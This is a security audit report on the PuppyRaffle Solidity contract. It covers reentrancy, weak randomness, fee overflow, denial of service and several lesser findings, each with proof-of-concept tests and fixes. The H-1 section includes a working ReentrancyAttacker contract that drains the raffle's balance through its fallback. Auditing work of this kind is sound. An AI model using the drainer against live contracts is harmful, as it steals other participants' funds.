### [H-1] Reentrancy in `PuppyRaffle::refund` allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` function does not follow [CEI] (Checks Effects Interactions) and as a result enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.


```javascript
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
```

A player who has entered the raffle could have `fallback`/`receive` fn that calls the `PuppyRaffle::refund` fn again and claim another refund.They could continue the cycle till the contract balance is drained.

**Impact**: All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Users enters the raffle.
2. Attacker sets up `fallback` that calls `PuppyRaffle::refund`
3. 3. Attacker entres the raffle.
4. Attacker calls `PuppyRaffle::refund` from their contracts, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>
Place the following in `PuppyRaffle.t.sol`

```javascript

    function testReentrancy() public  {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address bob = makeAddr("attackUser");
        vm.deal(bob,1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address (puppyRaffle).balance;

        vm.prank(bob);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attack contract balance: ", startingAttackContractBalance);
        console.log("starting contract balance: ", startingContractBalance);

        console.log("ending attack contract balance: ", address(attackerContract).balance);
        console.log("ending contract balance: ", address(puppyRaffle).balance);

    }
```

And this Attacker contract as well : 

```javascript

contract ReentrancyAttacker {
    PuppyRaffle puppyraffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyraffle) {
        puppyraffle = _puppyraffle;
        entranceFee = puppyraffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyraffle.enterRaffle{value :entranceFee}(players);

        attackerIndex = puppyraffle.getActivePlayerIndex(address(this)); 
        puppyraffle.refund(attackerIndex);
    }


    function stealMoney() internal {
        if(address(puppyraffle).balance >= entranceFee) {
            puppyraffle.refund(attackerIndex);
        }
    }
    fallback() external payable {
        stealMoney();
    }

    receive() external payable {
        stealMoney();
    }
}
```
</details>


**Recommended Mitigation:**  To prevent this we should have the `PuppyRaffle::refund` fn update `players` array before making the external call.
Additionally, we should move the event emit above as well.


```diff

    address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
        
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);


```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner`  allows users to influence or predict the winner

**Description:** hashing `msg.sender` , ``block.timestamp` , `block.difficulty` creates a predictable number. A predictable number is not a good random number.
Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselvles.

*Note:* This additionally means users could front—run this function and call `refund` if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and
selecting the `rarest` puppy. making the entire raffle worthless if it becomes a gas war as to who wins the raffles

**Proof of Concept:** 
1. Validators can know ahead of time the `block. timestamp` and `block. difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao) `block. difficulty` was recently replaced wih prevrandao.

2. User can mine/manipulate their `msg.sender` value to result in thir address being used to generated the winner!

3. Users can revert their `setectWinner` transaction if they dont like winner or
resulting puppy.

Using on—chain values as a randomness seed is a [well—documented attack vector](https://betterprogramming.pub/how—to—generate—truly—random-numbers—in—solidity—and—blockchain—9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VR.


### [H-3]  Integer Overflow of `PuppyRaffle::totalFees` loses fees 

**Description:** In solidity versions prior to `0.8.0` integers were
subject to integer overflows.

```javascript
uint64 myVar = type(uint64.max
// 18446744073709551615
myVar = myVar + 1
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner` , `totalfees` are accumulated for the `feesAddress` to collect later in `PuppyRaffle::withdrawFees`. However if the `totalFees` variable overflows the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract. 

**Proof of Concept:**
1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle.
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
//aka
totalFees = 8øøøøøoøøøøøøøøøøø + 178øøøøøøøøøøøøøøøø
// and this will overflow
totatFees = 153255926290448384 
```

4. you will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFeees`

Althought you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not the intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.

<details>
<summary>Code Snippet</summary>

```javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    } 
```

</details>

**Recommended Mitigation:** 
1. use a newer version of solidity , `uint256` instead of `uint64`
2. You could also use the `SafeMath` library of OpenZepplin for version 0.7.6 of solidity.
3. 3. remove the balance check from `PuppyRaffle::withdrawFees`

```diff
— require(address(this).balance uint256(totalFees),"PuppyRaffle: there are currently players active!");
```


### [M-1] Looping thru players array to check duplicates in `PuppyRaffle::enterRaffle` is a potencial Denial of Service(DoS) attack, incrementing gas cost for future entrants.

**Description:**  The `PuppyRaffle::enterRaffle` funtion loops thru the `players` array to check for duplicates. However , the longer the `PuppyRaffle::players` array is , the more checks a new player will have to make. this means gas costs for players who enter right the raffle starts will be dramatically lower than those who enter later.
Every addition address in the `players` array, is an additional check the loop will have to make.

```javascript
@audit DoS Attack
@> for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** 
The gas costs for raffle entrants will greatly increase as
more players enter the raffle. Discouraging later users from entering,
and causing a rush at the start of a raffle to be one of the first
entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that
no one else enters, guarenteeing themselves the win.

**Proof of Concept:**
If we have 2 sets of 100 players enters , the gas cost will be as:

 — 1st 100 players : ~6252048
 - 2nd 100 players : ~18068138

more than 3x for 2nd 100 players

<details>

<summary>POC</summary>
Place the following test into `./test/PuppyRaffle.t.sol`.

```javascript

        function test_denailOfService() public {

        vm.txGasPrice(1);
        // let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // see how much gas left 
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value : entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players : ", gasUsedFirst);
        
        //! for next 100 players
        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = address(i + playersNum);
        }

        // see how much gas left 
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value : entranceFee * players.length}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Gas cost of the first 100 players : ", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }

```
</details>

**Recommended Mitigation:** 

1. Consider allowing duplicates.Users can make new wallet addresses
anyways, so a duplicate check doesn't prevent the same person from
entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. this would allow constant time lookup whether user has already entered.


### [M-2] Smart contrac twallet raffle winner without a `receive` or `fallback` function will block the start of a new contest

**Description:**  The `PupptRaffle::selectWinner` fn is responsible for resetting the lottery. However , if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Users could easily call the & `selectWinner` function again and
non—wallet entrants could enter, but it could cost a lot due to the
duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

Also, true winners would not get paid out and someone else could take
their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or
receive function.
2. The lottery ends.
3. The `selectWinner` function wouldn't work, even though the lottery
is over!

**Recommended Mitigation:** 
1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses —> payout `amounts` so winners can pull their funds out themselves with a new `claimPrize`, putting the owness on the winner to claim their prize. (Recommended) (Pull over Push)


### [L-1] `PuppyRaffle::getActivePlayerIndex`  returns 0 for non existent players and for the players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at 0, this will return 0. but acc to natspec it will also return 0 if the player is not in the array.



```javascript

    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**   
1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0.
3. User thinks they have not entered correctly due to the function docs.


**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns —1 if the player is not active.

